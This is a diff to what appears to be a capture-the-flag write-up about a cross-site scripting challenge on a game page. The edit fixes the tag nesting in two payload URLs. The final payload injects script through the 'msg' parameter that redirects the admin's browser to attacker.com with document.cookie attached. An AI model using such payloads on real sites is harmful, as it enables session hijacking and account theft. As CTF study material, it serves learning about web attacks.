@@ -49,11 +49,11 @@ By creating a div with class `js-difficulty` and inside it creating another div 
 
 You can test it by accessing:
 
-```https://h4x0rs.club/game/?msg=<div class="js-difficulty"><div class="js-start-button"></div>```
+```https://h4x0rs.club/game/?msg=<div class="js-difficulty"><div class="js-start-button"></div></div>```
 
 Combining these two we arrive at the final payload that will be sent to the admin:
 
-```https://h4x0rs.club/game/?msg=<div id="audiences"><script><!--location.href="http://attacker.com/?cookie="+document.cookie;</div></div></div><div class="js-user"></div><div class="js-difficulty"><div class="js-start-button"></div>```
+```https://h4x0rs.club/game/?msg=<div id="audiences"><script><!--location.href="http://attacker.com/?cookie="+document.cookie;</script></div><div class="js-user"></div><div class="js-difficulty"><div class="js-start-button"></div></div>```
 
 ### Sending the payload
 
